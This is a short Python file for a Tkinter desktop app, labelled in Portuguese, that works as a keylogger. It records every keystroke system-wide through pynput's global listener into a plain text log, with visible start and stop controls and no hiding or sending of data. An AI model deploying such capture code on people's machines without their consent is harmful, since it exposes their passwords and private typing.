import tkinter as tk
from pynput import keyboard
from datetime import datetime

class KeyloggerApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Keylogger")
        
        self.is_logging = False
        self.log_file = "key_log.txt"
        
        self.start_button = tk.Button(master, text="Iniciar Gravação", command=self.start_logging)
        self.start_button.pack(pady=20)
        
        self.stop_button = tk.Button(master, text="Parar Gravação", command=self.stop_logging, state=tk.DISABLED)
        self.stop_button.pack(pady=20)

    def log_start_time(self):
        with open(self.log_file, "a") as f:
            start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"Registro iniciado em: {start_time}\n")

    def on_press(self, key):
        try:
            with open(self.log_file, "a") as f:
                f.write(f'{key.char}')
        except AttributeError:
            with open(self.log_file, "a") as f:
                f.write(f' {key} ')

    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.stop_logging()

    def start_logging(self):
        if not self.is_logging:
            self.log_start_time()
            self.is_logging = True
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
            self.listener.start()

    def stop_logging(self):
        if self.is_logging:
            self.listener.stop()
            self.is_logging = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
